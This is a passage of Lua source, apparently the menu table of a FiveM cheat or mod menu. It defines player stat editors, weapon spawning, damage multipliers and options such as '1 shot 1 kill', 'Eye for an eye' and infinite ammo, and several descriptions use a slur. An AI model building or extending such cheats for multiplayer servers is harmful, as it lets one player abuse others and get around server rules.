            {text = 'Stamina capacity', dkey = 'player:stateditor_stamina', desc = 'Set your stamina capacity.', afu = __REAPER1__.M.player.stateditor.stamina, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Stamina capacity number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Lung capacity', dkey = 'player:stateditor_lung', desc = 'Set your lung capacity.', afu = __REAPER1__.M.player.stateditor.lung, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Lung capacity number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Shooting ability', dkey = 'player:stateditor_shooting', desc = 'Set your shooting capacity.', afu = __REAPER1__.M.player.stateditor.shoot, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Shooting capacity number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Wheelie ability', dkey = 'player:stateditor_wheelie', desc = 'Set your wheelie capacity.', afu = __REAPER1__.M.player.stateditor.wheelie, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Wheelie capacity number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Driving ability', dkey = 'player:stateditor_driving', desc = 'Set your driving capacity.', afu = __REAPER1__.M.player.stateditor.driving, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Driving capacity number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Flying ability', dkey = 'player:stateditor_flying', desc = 'Set your flying capacity.', afu = __REAPER1__.M.player.stateditor.flying, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Flying capacity number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
        },
    
        ['weapon'] = {
            {text = 'Weapons', dkey = 'weapon:weapon', desc = 'Weapons menu.', option = __REAPER1__.M.Menu_Button, func = {'weapon', 'weapon:weapon'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Editor', dkey = 'weapon:editor', desc = 'Weapon editor menu.', option = __REAPER1__.M.Menu_Button, func = {'weapon', 'weapon:editor'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Modifiers', dkey = 'weapon:modifier', desc = 'Modifiers menu.', option = __REAPER1__.M.Menu_Button, func = {'weapon', 'weapon:modifier'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Entity gun', dkey = 'weapon:entitygun', desc = 'Entity gun menu.', option = __REAPER1__.M.Menu_Button, func = {'weapon', 'weapon:entitygun'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Ammo', dkey = 'weapon:ammo', desc = 'Ammo menu.', option = __REAPER1__.M.Menu_Button, func = {'weapon', 'weapon:ammo'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Debug gun', dkey = 'weapon:debuggun', desc = 'Debug gun menu.', option = __REAPER1__.M.Menu_Button, func = {'weapon', 'weapon:debuggun'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'General', option = __REAPER1__.M.Separator},
            {text = 'Upgrade', dkey = 'weapon:upgradeweapons', desc = 'Max out your weapons in attachments.', afu = __REAPER1__.M.weapon.upgradeweapons, option = __REAPER1__.M.Button},
            {text = 'Downgrade', dkey = 'weapon:downgradeweapons', desc = 'Remove every attachment on your\nweapons.', afu = __REAPER1__.M.weapon.downgradeweapons, option = __REAPER1__.M.Button},
            {text = 'Max ammo', dkey = 'weapon:maxammo', desc = 'Fill every weapon with ammo.', afu = __REAPER1__.M.weapon.maxammo, option = __REAPER1__.M.Button},
            {text = 'Remove ammo', dkey = 'weapon:removeammo', desc = 'Remove all of your ammo.', afu = __REAPER1__.M.weapon.removeammo, option = __REAPER1__.M.Button},
            {text = 'Accuary', dkey = 'weapon:accuary', desc = 'Set your weapon accuary precentage.', afu = __REAPER1__.M.weapon.accuary, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Weapon accuary number', length = 4, tipus = 'szam', func = __REAPER1__.T.Szazas},
            {text = '1 shot 1 kill', dkey = 'weapon:1shot1kill', desc = 'Instantly kill people, works best for close\nrange, body area. Not modifying weapon\ndamage.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Eye for an eye', dkey = 'weapon:eyeforaneye', desc = 'Whoever kills you will get instantly\nkilled.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Gun tint', dkey = 'weapon:guntintall', desc = 'Set all your weapon\'s tints.', afu = __REAPER1__.M.weapon.weapontint, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Weapon tint', length = 10, tipus = 'betu', func = {'Normal', 'Green', 'Gold', 'Pink', 'Army', 'LSPD', 'Orange', 'Platinum'}},
            {text = 'Rainbow tint', dkey = 'weapon:rainbowtint', desc = 'Enable rainbow tint on your current\nweapon.', afu = __REAPER1__.M.weapon.rainbowtint, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Cartoon gun', dkey = 'weapon:cartoongun', desc = 'Whenever you shoot comic effects\nwill appear.', afu = __REAPER1__.M.weapon.cartoongun, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Super gun', option = __REAPER1__.M.Separator},
            {text = 'Infinite ammo clip', dkey = 'weapon:infiniteammoclip', desc = 'Have infinite ammo in your current\nclip.', afu = __REAPER1__.M.weapon.infiniteammoinclip, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Rapid fire', dkey = 'weapon:rapidfire', desc = 'Shoot bullets really fast. You can even\nmultiply the amounts of bullets.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Rapid fire multiplier', length = 2, tipus = 'vegyes', toggle = false, func = {'x1', 'x2', 'x3'}},
            {text = 'Disable reload', dkey = 'weapon:disablereload', desc = 'Skip every reload.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Force reload', dkey = 'weapon:forcereload', desc = 'Force your ped to reload your\ncurrent weapon.', afu = __REAPER1__.M.weapon.forcereload, option = __REAPER1__.M.Button},
            {text = 'Invisible weapon', dkey = 'weapon:invisibleweapon', desc = 'Set your current weapon invisible.\nCan cause bugs.', afu = __REAPER1__.M.weapon.invisibleweapon, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Misc', option = __REAPER1__.M.Separator},
            {text = 'Set weapon (best)', dkey = 'weapon:setbestweapon', desc = 'Set your current weapon to the best\nowned weapon by you.', afu = __REAPER1__.M.weapon.setbestweapon, option = __REAPER1__.M.Button},
            {text = 'Set weapon', dkey = 'weapon:setweapon', desc = 'Set your current weapon. Only works\nwith owned weapons by you.', afu = __REAPER1__.M.weapon.setweapon, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'A weapon to set', length = 20, tipus = 'betu', func = __REAPER1__.T.Weapons},
            {text = 'Display weapon dmg', dkey = 'weapon:displayweapondmg', desc = 'Display your current weapon\'s\ndamage.', option = __REAPER1__.M.Checkbox, func = false},
        },
    
        ['weapon:weapon'] = {
            {text = 'Custom', dkey = 'weapon:weapon_custom', desc = 'Enter a weapon name to give or\nremove. Ex: pistol', afu = __REAPER1__.M.weapon.giveorremove.weapon, option = __REAPER1__.M.Button_Textbox, textboxtext = 'The weapon name', length = 50, tipus = 'vegyes', func = 'None'},
            {text = 'Melee', dkey = 'weapon:weapon_melee', desc = 'Give or remove a melee weapon.', afu = __REAPER1__.M.weapon.giveorremove.weapon, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Melee weapon', length = 50, tipus = 'betu', menuextra = 'image_weapon', func = {"Unarmed", "Knife", "Dagger", "Switchblade", "Hatchet", "Battleaxe", "Stone_Hatchet", "Machete", "Bat", "Golfclub", "Poolcue", "Nightstick", "Crowbar", "Wrench", "Hammer", "Flashlight", "Knuckle", "Bottle"}},
            {text = 'Handgun', dkey = 'weapon:weapon_handgun', desc = 'Give or remove a handgun.', afu = __REAPER1__.M.weapon.giveorremove.weapon, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Jandgun', length = 50, tipus = 'betu', menuextra = 'image_weapon', func = {"Pistol", "Pistol_MK2", "Combatpistol", "Appistol", "Stungun", "Pistol50", "Snspistol", "Snspistol_MK2", "Heavypistol", "Vintagepistol", "Flaregun", "Marksmanpistol", "Revolver", "Revolver_MK2", "Doubleaction", "Raypistol", "Ceramicpistol", "Navyrevolver"}},
            {text = 'Submachine gun', dkey = 'weapon:weapon_submachinegun', desc = 'Give or remove a submachine gun.', afu = __REAPER1__.M.weapon.giveorremove.weapon, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Submachine gun', length = 50, tipus = 'betu', menuextra = 'image_weapon', func = {"Microsmg", "Smg", "Smg_MK2", "Assaultsmg", "Combatpdw", "Machinepistol", "Minismg", "Raycarbine"}},
            {text = 'Shotgun', dkey = 'weapon:weapon_shotgun', desc = 'Give or remove a shotgun.', afu = __REAPER1__.M.weapon.giveorremove.weapon, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Shotgun', length = 50, tipus = 'betu', menuextra = 'image_weapon', func = {"Pumpshotgun", "Pumpshotgun_MK2", "Sawnoffshotgun", "Assaultshotgun", "Bullpupshotgun", "Musket", "Heavyshotgun", "Dbshotgun", "Autoshotgun"}},
            {text = 'Assault rifle', dkey = 'weapon:weapon_assaultrifle', desc = 'Give or remove a assault rifle.', afu = __REAPER1__.M.weapon.giveorremove.weapon, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Assault rifle', length = 50, tipus = 'betu', menuextra = 'image_weapon', func = {"Assaultrifle", "Assaultrifle_MK2", "Carbinerifle", "Carbinerifle_MK2", "Advancedrifle", "Specialcarbine", "Specialcarbine_MK2", "Bullpuprifle", "Bullpuprifle_MK2", "Compactrifle"}},
            {text = 'Light machine gun', dkey = 'weapon:weapon_lightmachinegun', desc = 'Give or remove a light machine gun.', afu = __REAPER1__.M.weapon.giveorremove.weapon, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Light machine gun', length = 50, tipus = 'betu', menuextra = 'image_weapon', func = {"Mg", "Combatmg", "Combatmg_MK2", "Gusenberg"}},
            {text = 'Sniper rifle', dkey = 'weapon:weapon_sniperrifle', desc = 'Give or remove a sniper rifle.', afu = __REAPER1__.M.weapon.giveorremove.weapon, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Sniper rifle', length = 50, tipus = 'betu', menuextra = 'image_weapon', func = {"Sniperrifle", "Heavysniper", "Heavysniper_MK2", "Marksmanrifle", "Marksmanrifle_MK2"}},
            {text = 'Heavy weapon', dkey = 'weapon:weapon_heavyweapon', desc = 'Give or remove a heavy weapon.', afu = __REAPER1__.M.weapon.giveorremove.weapon, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Heavy weapon', length = 50, tipus = 'betu', menuextra = 'image_weapon', func = {"RPG", "Grenadelauncher", "Minigun", "Firework", "Railgun", "Hominglauncher", "Compactlauncher", "Rayminigun"}},
            {text = 'Throwable', dkey = 'weapon:weapon_throwable', desc = 'Give or remove a throwable weapon.', afu = __REAPER1__.M.weapon.giveorremove.weapon, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Throwable weapon', length = 50, tipus = 'betu', menuextra = 'image_weapon', func = {"Grenade", "Bzgas", "Molotov", "Stickybomb", "Proxmine", "Snowball", "Pipebomb", "Ball", "Smokegrenade", "Flare"}},
            {text = 'Miscellaneous', dkey = 'weapon:weapon_miscellaneous', desc = 'Give or remove a miscellaneous weapon.', afu = __REAPER1__.M.weapon.giveorremove.weapon, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Miscellaneous weapon', length = 50, tipus = 'betu', menuextra = 'image_weapon', func = {"Petrolcan", "Parachute", "Fireextinguisher"}},
            {text = 'Give', option = __REAPER1__.M.Separator},
            {text = 'All weapons', dkey = 'weapon:weapon_allweapons', desc = 'Give all weapons to yourself.', afu = __REAPER1__.M.weapon.giveorremove.allweapons, option = __REAPER1__.M.Button},
            {text = 'Equip instantly', dkey = 'weapon:weapon_equipinstantly', desc = 'Equip the given weapon instantly.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Ammo', dkey = 'weapon:weapon_ammo', desc = 'Get the weapon with this amount of\nammo.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Weapon ammo amount', length = 20, tipus = 'szam', func = 0},
            {text = 'With extended clip', dkey = 'weapon:weapon_extendedclip', desc = 'Get the weapon with a extended clip.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'With flashlight', dkey = 'weapon:weapon_flashlight', desc = 'Get the weapon with a flashlight.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'With suppressor', dkey = 'weapon:weapon_suppressor', desc = 'Get the weapon with a suppressor.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'With scope', dkey = 'weapon:weapon_scope', desc = 'Get the weapon with a scope.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Remove', option = __REAPER1__.M.Separator},
            {text = 'All weapons', dkey = 'weapon:weapon_removeallweapons', desc = 'Remove every owned weapon by you.', afu = __REAPER1__.M.weapon.giveorremove.removeallweapons, option = __REAPER1__.M.Button},
            {text = 'With ammo', dkey = 'weapon:weapon_withammo', desc = 'Remove the weapon with ammo.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Current', dkey = 'weapon:weapon_current', desc = 'Remove your current weapon.', afu = __REAPER1__.M.weapon.giveorremove.current, option = __REAPER1__.M.Button},
        },
    
        ['weapon:editor'] = {
        },

        ['weapon:knuckle'] = {
            {text = 'Base variant', dkey = 'weapon:knuckle_base', desc = 'Enable the base variant.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_KNUCKLE_VARMOD_BASE`},
            {text = 'Pimp variant', dkey = 'weapon:knuckle_pimp', desc = 'Enable the pimp variant.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_KNUCKLE_VARMOD_PIMP`},
            {text = 'Ballas variant', dkey = 'weapon:knuckle_ballas', desc = 'Enable the ballas variant.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_KNUCKLE_VARMOD_BALLAS`},
            {text = 'Hustler variant', dkey = 'weapon:knuckle_hustler', desc = 'Enable the hustler variant.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_KNUCKLE_VARMOD_DOLLAR`},
            {text = 'Rock variant', dkey = 'weapon:knuckle_rock', desc = 'Enable the rock variant.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_KNUCKLE_VARMOD_DIAMOND`},
            {text = 'Hater variant', dkey = 'weapon:knuckle_hater', desc = 'Enable the hater variant.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_KNUCKLE_VARMOD_HATE`},
            {text = 'Lover variant', dkey = 'weapon:knuckle_lover', desc = 'Enable the lover variant.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_KNUCKLE_VARMOD_LOVE`},
            {text = 'Player variant', dkey = 'weapon:knuckle_player', desc = 'Enable the player variant.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_KNUCKLE_VARMOD_PLAYER`},
            {text = 'King variant', dkey = 'weapon:knuckle_king', desc = 'Enable the king variant.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_KNUCKLE_VARMOD_KING`},
            {text = 'Vagos variant', dkey = 'weapon:knuckle_vagos', desc = 'Enable the vagos variant.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_KNUCKLE_VARMOD_VAGOS`},
        },
        
        ['weapon:switchblade'] = {
            {text = 'Default', dkey = 'weapon:switchblade_default', desc = 'Enable the default variant.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SWITCHBLADE_VARMOD_BASE`},
            {text = 'Vip variant', dkey = 'weapon:switchblade_vip', desc = 'Enable the vip variant.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SWITCHBLADE_VARMOD_VAR1`},
            {text = 'Bodyguard variant', dkey = 'weapon:switchblade_bodyguard', desc = 'Enable the bodyguard variant.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SWITCHBLADE_VARMOD_VAR2`},
        },
        
        ['weapon:pistol'] = {
            {text = 'Set ammo', dkey = 'weapon:pistol_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:pistol_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:pistol_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:pistol_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:pistol_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:pistol_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PISTOL_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:pistol_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PISTOL_CLIP_02`},
            {text = 'Flashlight', dkey = 'weapon:pistol_flashlight', desc = 'Enable the flashlight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_PI_FLSH`},
            {text = 'Suppressor', dkey = 'weapon:pistol_suppressor', desc = 'Enable the suppressor.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_PI_SUPP_02`},
            {text = 'Luxury variant', dkey = 'weapon:pistol_luxuryvariant', desc = 'Enable the luxury variant.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PISTOL_VARMOD_LUXE`},
        },
        
        ['weapon:combatpistol'] = {
            {text = 'Set ammo', dkey = 'weapon:combatpistol_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:combatpistol_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:combatpistol_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:combatpistol_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:combatpistol_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:combatpistol_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_COMBATPISTOL_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:combatpistol_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_COMBATPISTOL_CLIP_02`},
            {text = 'Flashlight', dkey = 'weapon:combatpistol_flashlight', desc = 'Enable the flashlight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_PI_FLSH`},
            {text = 'Suppressor', dkey = 'weapon:combatpistol_suppressor', desc = 'Enable the suppressor.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_PI_SUPP`},
            {text = 'Luxury variant', dkey = 'weapon:combatpistol_luxuryvariant', desc = 'Enable the luxury variant.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_COMBATPISTOL_VARMOD_LOWRIDER`},
        },
        
        ['weapon:appistol'] = {
            {text = 'Set ammo', dkey = 'weapon:appistol_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:appistol_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:appistol_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:appistol_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:appistol_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:appistol_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_APPISTOL_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:appistol_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_APPISTOL_CLIP_02`},
            {text = 'Flashlight', dkey = 'weapon:appistol_flashlight', desc = 'Enable the flashlight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_PI_FLSH`},
            {text = 'Suppressor', dkey = 'weapon:appistol_suppressor', desc = 'Enable the suppressor.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_PI_SUPP`},
            {text = 'Luxury variant', dkey = 'weapon:appistol_luxuryvariant', desc = 'Enable the luxury variant.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_APPISTOL_VARMOD_LUXE`},
        },
        
        ['weapon:pistol50'] = {
            {text = 'Set ammo', dkey = 'weapon:pistol50_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:pistol50_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:pistol50_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:pistol50_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:pistol50_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:pistol50_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PISTOL50_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:pistol50_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PISTOL50_CLIP_02`},
            {text = 'Flashlight', dkey = 'weapon:pistol50_flashlight', desc = 'Enable the flashlight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_PI_FLSH`},
            {text = 'Suppressor', dkey = 'weapon:pistol50_suppressor', desc = 'Enable the suppressor.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_SUPP_02`},
            {text = 'Luxury variant', dkey = 'weapon:pistol50_luxuryvariant', desc = 'Enable the luxury variant.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PISTOL50_VARMOD_LUXE`},
        },
        
        ['weapon:revolver'] = {
            {text = 'Set ammo', dkey = 'weapon:revolver_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:revolver_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:revolver_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:revolver_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:revolver_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:revolver_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_REVOLVER_CLIP_01`},
